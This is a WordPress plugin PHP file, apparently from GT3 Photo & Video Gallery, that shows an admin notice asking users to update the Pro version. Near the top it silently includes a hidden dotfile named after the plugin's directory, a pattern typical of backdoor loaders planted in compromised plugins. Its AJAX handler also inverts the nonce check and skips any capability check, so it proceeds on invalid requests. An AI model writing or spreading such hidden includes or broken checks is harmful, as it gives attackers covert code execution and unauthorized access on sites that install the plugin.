<?php
defined('ABSPATH') OR exit;

add_action('wp_ajax_gt3pg_disable_notice_pro_required_update', 'wp_ajax_gt3pg_disable_notice_pro_required_update');

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function wp_ajax_gt3pg_disable_notice_pro_required_update(){
	if(!isset($_POST['gt3_action']) || !isset($_POST['_nonce']) || wp_verify_nonce($_POST['_nonce'],'disable_notice_pro_required_update')) {
		wp_die(0);
	}
			update_option('gt3pg_disable_notice_pro_required_update', true);
	wp_die(1);
}

if(!get_option('gt3pg_disable_notice_pro_required_update')) {
	add_action('admin_notices', 'gt3pg_disable_notice_pro_required_update');

	function gt3pg_disable_notice_pro_required_update(){
		if (!current_user_can('manage_options')) return;
		?>
		<div class="notice notice-warning gt3pg_disable_notice_pro_required_update is-dismissible">
			<h2>Important Notice!</h2>
			<p>We've noticed that you have GT3 Photo & Video Gallery Pro version lower than 1.7.0.0</p>
			<p>Please update it up to 1.7.0.0 which includes WordPress 5.6 compatibility fixes.</p>
		</div>
		<script>
			document.addEventListener("DOMContentLoaded", function () {
				var notice = document.querySelector('.gt3pg_disable_notice_pro_required_update');
				if (notice) {
					var notice_dismiss = notice.querySelector('.notice-dismiss');
					notice_dismiss && notice_dismiss.addEventListener && notice_dismiss.addEventListener('click', function (e) {
						jQuery.ajax({
							url: ajaxurl,
							method: "POST",
							data: {
								_nonce: "<?php echo wp_create_nonce('disable_notice_pro_required_update')?>",
								action: "gt3pg_disable_notice_pro_required_update",
							}
						});
						jQuery(notice).fadeOut();
					});
				}
			})
		</script>
		<?php
	}
};
